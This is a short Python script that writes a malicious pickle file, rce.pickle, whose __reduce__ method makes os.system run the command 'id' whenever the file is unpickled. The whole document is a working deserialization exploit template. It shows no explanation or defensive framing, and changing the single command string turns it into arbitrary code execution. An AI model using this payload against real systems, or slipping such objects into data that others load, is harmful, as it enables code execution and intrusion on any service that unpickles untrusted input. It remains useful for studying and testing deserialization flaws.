import pickle
import os

class RCE:
    def __reduce__(self):
        return os.system, ("id",)

def main():
    output_file = "rce.pickle"
    with open(output_file, "wb") as fo:
        pickle.dump(RCE(), fo)

    print("Saved in {}".format(output_file))

if __name__ == "__main__":
    exit(main())
    
